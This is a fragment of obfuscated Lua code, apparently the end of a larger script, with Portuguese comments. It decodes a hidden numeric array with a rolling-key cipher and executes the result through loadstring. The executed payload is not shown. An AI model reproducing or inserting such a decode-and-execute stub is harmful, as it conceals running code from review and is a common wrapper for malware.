    local function VM_OlO1(d, k, m)
        local R_00OIO1O = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_00OIO1O, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_00OIO1O)
    end

    -- Execution Guard
    local F_O11OlIlI = loadstring(VM_OlO1(B_I01I, 91, 5))
    if F_O11OlIlI then
        F_O11OlIlI(...)
    end
end)(...)
